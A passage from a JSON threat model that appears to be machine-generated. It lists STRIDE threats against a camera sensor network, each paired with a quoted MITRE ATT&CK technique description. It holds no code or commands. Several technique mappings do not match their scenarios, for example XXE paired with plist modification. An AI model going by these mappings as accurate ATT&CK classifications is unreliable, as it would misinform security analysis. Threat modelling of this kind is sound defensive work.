            "Threat Type": "Spoofing",
            "Scenario": "An attacker could use spoofed command and control signals to mislead camera nodes and alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the capability to send signals within the network.",
                    "Role": "Attacker",
                    "Condition": "The network communication is not fully secured."
                },
                {
                    "Assumption": "The application lacks secure command validation protocols.",
                    "Role": "System Designer",
                    "Condition": "Command validation mechanisms are weak or absent."
                },
                {
                    "Assumption": "Attacker can disguise the spoofed signals to appear as authorized.",
                    "Role": "Attacker",
                    "Condition": "The spoofing detection measures are insufficient."
                }
            ],
            "Potential Impact": "Data integrity compromise, potential denial of service.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Command Injection",
                "Network",
                "Device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and modifies communication between the VSN components, pretending to be a trusted component in the network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network communication channels.",
                    "Role": "Attacker",
                    "Condition": "Network security is compromised."
                },
                {
                    "Assumption": "The system does not employ end-to-end encryption for data transmission.",
                    "Role": "System Designer",
                    "Condition": "Encryption mechanisms are not implemented."
                },
                {
                    "Assumption": "The attacker can accurately simulate the behavior of a trusted component.",
                    "Role": "Attacker",
                    "Condition": "System monitoring and anomaly detection are not robust."
                }
            ],
            "Potential Impact": "Confidentiality breach, data integrity compromise, service disruption.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Man-in-the-middle",
                "Network",
                "Communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits an XML External Entity (XXE) vulnerability in the application to alter configuration files.",
            "Assumptions": [
                {
                    "Assumption": "The application uses vulnerable XML parsers.",
                    "Role": "Application Developer",
                    "Condition": "Vulnerable libraries are not patched."
                },
                {
                    "Assumption": "The attacker can inject malicious XML content.",
                    "Role": "Attacker",
                    "Condition": "Input sanitization is inadequate."
                },
                {
                    "Assumption": "Config files are critical for the application\u2019s operation.",
                    "Role": "System Designer",
                    "Condition": "The system relies heavily on its configuration settings."
                }
            ],
            "Potential Impact": "Data integrity compromise, service disruption.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Injection",
                "Configuration",
                "XML"
            ],
            "mitre_technique": {
                "name": "Plist Modification",
                "description": "Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). \nAdversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)",
                "id": "attack-pattern--06780952-177c-4247-b978-79c357fb311f",
                "technique_id": "T1150"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker uses an out-of-bounds write vulnerability to execute code and alter the application\u2019s data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access rights to interact with the kernel.",
                    "Role": "Attacker",
                    "Condition": "Access controls are insufficient or the attacker is insider."
                },
                {
                    "Assumption": "The application contains an out-of-bounds write vulnerability.",
                    "Role": "Application Developer",
                    "Condition": "Vulnerability is present and unpatched."
                },
                {
                    "Assumption": "Sensitive data or application operations are performed on the compromised memory space.",
                    "Role": "System Designer",
                    "Condition": "Critical operations rely on memory spaces are not protected."
                }
            ],
            "Potential Impact": "Unauthorized code execution, data corruption.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Code Injection",
                "Exploitation",
                "Memory"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits directory traversal vulnerabilities to alter system files or install malicious executables.",
            "Assumptions": [
                {
                    "Assumption": "The application has an exposure to directory traversal attacks.",
                    "Role": "Application Developer",
                    "Condition": "Invalid or improper path sanitization."
                },
                {
                    "Assumption": "The attacker gains access through the internet-facing component.",
                    "Role": "Attacker",
                    "Condition": "Access control mechanisms for external access are weak."
                },
                {
                    "Assumption": "Critical system files are not adequately protected.",
                    "Role": "System Administrator",
                    "Condition": "File permission settings are misconfigured or too permissive."
                }
            ],
            "Potential Impact": "Data integrity compromise, unauthorized system control.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Directory Traversal",
                "File System",
                "Exploitation"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies malicious activities by manipulating log files via an out-of-bounds write vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "The application runs on a vulnerable OS.",
                    "Role": "System Administrator",
                    "Condition": "OS and necessary patches are outdated."
                },
                {
                    "Assumption": "Log files are stored and accessed similarly vulnerable paths.",
                    "Role": "System Designer",
                    "Condition": "Logging mechanism does not implement secure storage."
                },
                {
                    "Assumption": "The attacker can gain elevated privileges allowing log manipulations.",
                    "Role": "Attacker",
                    "Condition": "Privilege escalation vulnerabilities exist."
                }
            ],
            "Potential Impact": "Data confidentiality breach, accountability issues.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Log Manipulation",
                "Elevation of Privilege",
                "Kernel"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker erases security logs remotely to cover their tracks after exploiting a command injection vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "Security logging mechanism is accessible and editable from remote.",
                    "Role": "System Administrator",
                    "Condition": "Log files are not secured against unauthorized access."
                },
                {
                    "Assumption": "The attacker can exploit the vulnerability to gain unauthorized remote access.",
                    "Role": "Attacker",
                    "Condition": "Remote code execution flaw is present."
                },
                {
                    "Assumption": "The application does not implement an immutable logging mechanism.",
                    "Role": "System Designer",
                    "Condition": "Log integrity protection measures are weak or absent."
                }
            ],
            "Potential Impact": "Accountability and traceability issues.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Log Deletion",
                "Remote Access",
                "Code Injection"
            ],
            "mitre_technique": {
                "name": "Redundant Access",
                "description": "**This technique has been deprecated. Please use [Create Account](https://attack.mitre.org/techniques/T1136), [Web Shell](https://attack.mitre.org/techniques/T1505/003), and [External Remote Services](https://attack.mitre.org/techniques/T1133) where appropriate.**\n\nAdversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. \n\nIf one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications.\n\nUse of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.",
                "id": "attack-pattern--6aabc5ec-eae6-422c-8311-38d45ee9838a",
                "technique_id": "T1108"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates transaction records transmitted over an unencrypted channel and later disputes their actions.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive data transmission occurs over unsecure channels.",
                    "Role": "System Designer",
                    "Condition": "Encryption is not enforced during data exchange."
                },
                {
                    "Assumption": "Transactions and activities are logged without integrity checks.",
                    "Role": "Application Developer",
                    "Condition": "Logging lacks verification mechanisms."
                },
                {
                    "Assumption": "The attacker has access to intercept and alter the data transmission.",
                    "Role": "Attacker",
                    "Condition": "Network security is compromised or weak."
                }
            ],
            "Potential Impact": "Data integrity breach, accountability issues.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Manipulation",
                "Data Transmission",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits an XXE vulnerability to access sensitive files stored in the system.",
            "Assumptions": [
                {
                    "Assumption": "Application processes untrusted XML data.",
                    "Role": "Application Developer",
                    "Condition": "Application\u2019s XML parser is vulnerable."
                },
                {
                    "Assumption": "Sensitive files are accessible by the vulnerable process.",
                    "Role": "System Administrator",
                    "Condition": "File permissions allow the process to read sensitive files."
                },
                {
                    "Assumption": "The attacker can interact with the application's XML interfaces.",
                    "Role": "Attacker",
                    "Condition": "Application lacks input validation."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "XML",
                "File Access",
                "Exploitation"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted video streams being transmitted over the network.",
            "Assumptions": [
                {
                    "Assumption": "Transmission occurs over unencrypted network channels.",
                    "Role": "Network Engineer",
                    "Condition": "Encryption for data transmission is not enforced."
                },
                {
                    "Assumption": "Attacker has network access to monitor or intercept the traffic.",
                    "Role": "Attacker",
                    "Condition": "Network security is compromised."
                },
                {
                    "Assumption": "Video streams contain sensitive visual data.",
                    "Role": "Application User",
                    "Condition": "Visual data is critical."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive visual information.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Network",
                "Video Stream",
                "Interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker uses a deserialization vulnerability to extract sensitive user credentials from the application.",
            "Assumptions": [
                {
                    "Assumption": "The application uses insecure deserialization mechanisms.",
                    "Role": "Application Developer",
                    "Condition": "Code uses untrusted deserialization."
                },
                {
                    "Assumption": "Critical data (like user credentials) is serialized within the application.",
                    "Role": "System Designer",
                    "Condition": "Sensitive data is not adequately protected."
                },
                {
                    "Assumption": "The attacker can interact with the deserialization process.",
                    "Role": "Attacker",
                    "Condition": "Input sanitization is weak or missing."
                }
            ],
            "Potential Impact": "Unauthorized access to user credentials.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Deserialization",
                "Credential Access",
                "Exploitation"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends specially crafted shader code to exploit an out-of-bounds write vulnerability, causing the system to crash.",
            "Assumptions": [
                {
                    "Assumption": "The application runs on a vulnerable GPU driver.",
                    "Role": "System Administrator",
                    "Condition": "Driver is outdated and vulnerable."
                },
                {
                    "Assumption": "The application processes input that includes shader code.",
                    "Role": "Application Developer",
                    "Condition": "Application allows user-provided shader code."
                },
                {
                    "Assumption": "The attacker can send malicious shader code to the application.",
                    "Role": "Attacker",
                    "Condition": "Network security is compromised."
                }
            ],
            "Potential Impact": "Service disruption.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Crash",
                "GPU",
                "Shader"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker leverages the XXE vulnerability to cause the system to consume all resources and become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The XML parser is vulnerable to XXE attacks.",
                    "Role": "Application Developer",
                    "Condition": "Vulnerability is present and exploitable."
                },
                {
                    "Assumption": "The attacker can inject malicious XML content to consume resources.",
                    "Role": "Attacker",
                    "Condition": "Input is not sanitized."
                },
                {
                    "Assumption": "The application lacks resource limitation mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Resource allocation is not controlled effectively."
                }
            ],
            "Potential Impact": "System becomes unresponsive, service disruption.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Resource Consumption",
                "XML",
                "Injection"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a directory traversal vulnerability to delete critical files, causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "The system is vulnerable to directory traversal attacks.",
                    "Role": "Application Developer",
                    "Condition": "Sanitization of file paths is inadequate."
                },
                {
                    "Assumption": "Critical files are not protected from deletion.",
                    "Role": "System Administrator",
                    "Condition": "File permissions allow deletion."
                },
                {
                    "Assumption": "The attacker has access to submit crafted requests.",
                    "Role": "Attacker",
                    "Condition": "Access control mechanisms are weak."
                }
            ],
            "Potential Impact": "Service disruption due to critical file deletion.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Directory Traversal",
                "File Deletion",
                "System"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
